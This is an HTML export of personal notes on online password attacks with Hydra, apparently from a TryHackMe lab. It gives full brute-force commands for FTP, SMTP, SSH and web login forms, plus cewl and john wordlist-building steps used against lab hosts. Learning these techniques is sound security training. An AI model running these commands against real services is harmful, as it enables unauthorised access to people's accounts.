<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Online Dictionary (Hydra)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Online Dictionary (Hydra)</h1><br/><p><strong><h1>Hydra</h1></strong></p><p></p><p></p><p><strong><h3>FTP</h3></strong></p><p></p><p><strong>hydra -l ftp -P passlist.txt ftp://10.10.x.x</strong> </p><p></p><p><strong>-l</strong> ftp we are specifying a single username, use-L for a username wordlist</p><p></p><p><strong>-P</strong> Path specifying the full path of wordlist, you can specify a single password by using -p.</p><p></p><p><strong>ftp://10.10.x.x</strong> the protocol and the IP address or the fully qualified domain name (FDQN) of the target.</p><p></p><p></p><p><strong><h3>SMTP</h3></strong></p><p></p><p><strong>hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v </strong></p><p></p><p></p><p><strong><h3>SSH</h3></strong></p><p></p><p><strong>hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v</strong></p><p></p><p></p><p><strong><h3>HTTP Login Pages</h3></strong></p><p></p><p><strong>hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f </strong></p><p></p><p><strong>-l admin </strong> we are specifying a single username, use-L for a username wordlist</p><p></p><p><strong>-P</strong> Path specifying the full path of wordlist, you can specify a single password by using -p.</p><p></p><p><strong>10.10.x.x </strong>the IP address or the fully qualified domain name (FQDN) of the target.</p><p></p><p><strong>http-get-form</strong> the type of HTTP request, which can be either http-get-form or http-post-form.</p><p></p><p>Next, we specify the URL, path, and conditions that are split using :</p><p></p><p><strong>login-get/index.php</strong> the path of the login page on the target webserver.</p><p></p><p><strong>username=^USER^&amp;password=^PASS^</strong> the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.</p><p></p><p>The following section is important to eliminate false positives by specifying the &#39;failed&#39; condition with F=.</p><p></p><p>And success conditions, <strong>S=</strong>. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage &#39;Invalid password&#39; after a failed login, set <strong>F=Invalid Password</strong>.</p><p></p><p>Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.</p><p></p><p><strong>S=logout.php</strong> the success condition to identify the valid credentials</p><p></p><p><strong>-f</strong> to stop the brute-forcing attacks after finding a valid username and password</p><p></p><p></p><p></p><p><strong><h3>Other Tools</h3></strong></p><p></p><p>Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:</p><p></p><p><strong>    Medusa</strong></p><p><strong>    Ncrack</strong></p><p></p><p></p><p><strong><h3>Room Task Commands</h3></strong></p><p></p><p><strong><span style="text-decoration:underline;">Task - 8</span></strong></p><p>To get initial wordlist: </p><p><strong>cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/ </strong></p><p></p><p>Then, we need to add the format using john rules <strong>[symbol][dictionary word][0-9][0-9]</strong>. </p><p></p><p>John Rule:</p><p><strong>[List.Rules:THM-Room]</strong></p><p><strong>Az&quot;[0-9][0-9]&quot; ^[!#$%&amp;*@]</strong></p><p></p><p>Then we use john to create the updated wordlist.</p><p></p><p><strong>john --wordlist=clinic.lst --rules=THM-Room --stdout &gt; clinic_rules.lst</strong></p><p></p><p>Then, we use hydra to crack the password.</p><p></p><p><strong>hydra -l pittman@clinic.thmredteam.com -P clinic_rules.lst smtp://10.10.54.214 -v</strong></p><p></p><p><img src="images/400-1.png" alt="images/400-1.png" /></p><p></p><p></p><p>Webpage Bruteforce:</p><p></p><p><strong>hydra -l phillips -P clinic.lst 10.10.54.214 http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f -vv -t 64</strong></p><p></p><p>Note: The <strong>F </strong>method with <strong>Login failed!</strong> didn&#39;t work due to the exclamation mark</p><p></p><p><img src="images/400-2.png" alt="images/400-2.png" /></p><p></p><p></p><p></p><p>As per Hint: <strong>john --wordlist=clinic.lst --rules=Single-Extra --stdout &gt; clinic_rules3.lst</strong></p><p></p><p>Then, we use it with hydra</p><p></p><p><strong>hydra -l burgess -P clinic_rules3.lst 10.10.54.214 http-post-form &quot;/login-post/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f -t 64 -v</strong></p><p></p><p><img src="images/400-3.png" alt="images/400-3.png" /></p></div>
</body>
</html>
